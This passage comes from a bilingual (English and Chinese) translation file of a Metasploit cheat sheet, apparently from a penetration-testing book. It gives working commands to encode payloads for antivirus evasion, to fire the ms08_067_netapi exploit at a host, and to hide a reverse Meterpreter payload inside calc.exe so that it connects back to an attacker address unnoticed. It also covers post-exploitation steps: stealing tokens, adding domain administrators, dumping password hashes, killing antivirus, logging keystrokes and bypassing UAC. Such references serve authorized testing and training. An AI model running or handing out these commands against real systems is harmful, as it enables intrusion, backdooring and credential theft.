    -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe`**'
- en: Create a multi-encoded payload.
  id: totrans-181
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 创建一个多编码有效载荷。
- en: '**`msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c`**'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c`**'
- en: Create pure alphanumeric shellcode where ESI points to the shellcode; output
    in C-style notation.
  id: totrans-183
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 创建纯字母数字的 shellcode，其中 ESI 指向 shellcode；以 C 风格的表示法输出。
- en: MSFcli Commands
  id: totrans-184
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: MSFcli 命令
- en: '**`msfcli | grep exploit`**'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfcli | grep exploit`**'
- en: Show only exploits.
  id: totrans-186
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 仅显示漏洞利用。
- en: '**`msfcli | grep exploit/windows`**'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfcli | grep exploit/windows`**'
- en: Show only Windows exploits.
  id: totrans-188
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 仅显示 Windows 漏洞利用。
- en: '**`msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp
    LPORT=443 RHOST=172.16.32.142 E`**'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp
    LPORT=443 RHOST=172.16.32.142 E`**'
- en: Launch `ms08_067_netapi` exploit at 172.16.32.142 with a `bind_tcp` payload
    being delivered to listen on port 443.
  id: totrans-190
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在 172.16.32.142 上启动 `ms08_067_netapi` 漏洞利用，使用 `bind_tcp` 有效载荷监听端口 443。
- en: MSF, Ninja, Fu
  id: totrans-191
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: MSF, Ninja, Fu
- en: '**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R
    | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe`**'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R
    | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe`**'
- en: Create a reverse Meterpreter payload connecting back to 192.168.1.5 on port
    443 using *calc.exe* as a template to backdoor. Keep execution flow within the
    application for it to continue to work, and output the `shikata_ga_nai` encoded
    payload to *payload.exe*.
  id: totrans-193
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 *calc.exe* 作为后门模板，创建一个连接回192.168.1.5端口443的反向Meterpreter有效载荷。保持应用程序内的执行流程，以便它继续工作，并将
    `shikata_ga_nai` 编码的有效载荷输出到 *payload.exe*。
- en: '**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R
    | msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe`**'
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R
    | msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe`**'
- en: Create a reverse Meterpreter payload connecting back to 192.168.1.5 on port
    443 using *calc.exe* as a template to backdoor. Does not keep execution flow within
    the application and will not prompt anything back to the end user when it is executed.
    This is useful when you have remote access via a browser exploit and don’t want
    the calculator application popping up to the end user. Also outputs the `shikata_ga_nai`
    encoded payload to *payload.exe*.
  id: totrans-195
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 *calc.exe* 作为后门模板，创建一个连接回192.168.1.5端口443的反向Meterpreter有效载荷。不保持应用程序内的执行流程，在执行时不会向最终用户提示任何内容。这在您通过浏览器漏洞远程访问时很有用，并且不想让计算器应用程序出现在最终用户面前。同时将
    `shikata_ga_nai` 编码的有效载荷输出到 *payload.exe*。
- en: '**`msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe
    -e x86/shikata_ga_nai -c 7 -t exe && msfcli multi/handler PAYLOAD=windows/meterpreter/bind_tcp
    LPORT=443 E`**'
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe
    -e x86/shikata_ga_nai -c 7 -t exe && msfcli multi/handler PAYLOAD=windows/meterpreter/bind_tcp
    LPORT=443 E`**'
- en: Create a `bind_tcp` Meterpreter payload in raw format, encode it seven times
    using `shikata_ga_nai`, output it in Windows portable executable format with a
    name of *payload.exe*, and then have a multi-handler listening for it to execute.
  id: totrans-197
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 以原始格式创建一个 `bind_tcp` Meterpreter 有效载荷，使用 `shikata_ga_nai` 编码七次，以Windows便携式可执行文件格式输出，命名为
    *payload.exe*，然后让一个多处理器监听以执行它。
- en: MSFvenom
  id: totrans-198
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: MSFvenom
- en: 'Leverage *msfvenom*, an all-in-one suite, to create and encode your payload:'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 利用一站式套件 *msfvenom* 创建和编码您的有效载荷：
- en: '[PRE0]'
  id: totrans-200
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: This one liner will create a payload and automatically generate it in an executable
    format.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 这条单行命令将创建一个有效载荷，并自动将其生成为可执行格式。
- en: Meterpreter Post Exploitation Commands
  id: totrans-202
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Meterpreter 后渗透攻击命令
- en: 'Elevate your permissions on Windows-based systems using Meterpreter:'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 使用Meterpreter在基于Windows的系统上提升您的权限：
- en: '[PRE1]'
  id: totrans-204
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Steal a domain administrator token from a given process ID, add a domain account,
    and then add it to the *Domain Admins* group:'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 从给定的进程ID中窃取域管理员令牌，添加域账户，并将其添加到 *Domain Admins* 组：
- en: '[PRE2]'
  id: totrans-206
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'Dump password hashes from the SAM database:'
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 从SAM数据库中转储密码哈希：
- en: '[PRE3]'
  id: totrans-208
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: '* * *'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: '* * *'
- en: Note
  id: totrans-210
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: On Win2k8 you may need to migrate to a process that is running as SYSTEM if
    `-getsystem` and `hashdump` throw exceptions.
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 在Win2k8上，如果您在 `-getsystem` 和 `hashdump` 抛出异常时，可能需要迁移到作为SYSTEM运行的进程。
- en: '* * *'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: '* * *'
- en: 'Automigrate to a separate process:'
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 自动迁移到单独的进程：
- en: '[PRE4]'
  id: totrans-214
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Kill antivirus processes running on the target via the *killav* Meterpreter
    script:'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 通过 *killav* Meterpreter 脚本在目标上终止正在运行的防病毒进程：
- en: '[PRE5]'
  id: totrans-216
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'Capture keystrokes on target machines from within a particular process:'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 在特定进程中捕获目标机器上的按键：
- en: '[PRE6]'
  id: totrans-218
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'Use Incognito to impersonate an administrator:'
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 使用Incognito来模拟管理员：
- en: '[PRE7]'
  id: totrans-220
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'See what protection mechanisms are in place on the compromised target, display
    the help menu, disable Windows Firewall, and kill all counter-measures found:'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 查看受损害目标上的保护机制，显示帮助菜单，禁用Windows防火墙，并终止所有发现的反制措施：
- en: '[PRE8]'
  id: totrans-222
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'Identify whether the compromised system is a virtual machine:'
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 确定受损害的系统是否为虚拟机：
- en: '[PRE9]'
  id: totrans-224
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'Drop into a command shell for a current Meterpreter console session:'
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 在当前Meterpreter控制台会话中进入命令行：
- en: '[PRE10]'
  id: totrans-226
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'Get a remote GUI (VNC) on the target machine:'
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 在目标机器上获取远程GUI（VNC）：
- en: '[PRE11]'
  id: totrans-228
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'Background a currently running Meterpreter console:'
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: 将当前运行的Meterpreter控制台置于后台：
- en: '[PRE12]'
  id: totrans-230
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: 'Bypass Windows User Access Control:'
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 绕过Windows用户访问控制：
- en: '[PRE13]'
  id: totrans-232
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'Dump Hashes on an OS X system:'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 在OS X系统上转储哈希值：
- en: '[PRE14]'
  id: totrans-234
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'Dump Hashes on a Linux system:'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 在Linux系统上转储哈希值：
- en: '[PRE15]'
  id: totrans-236
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
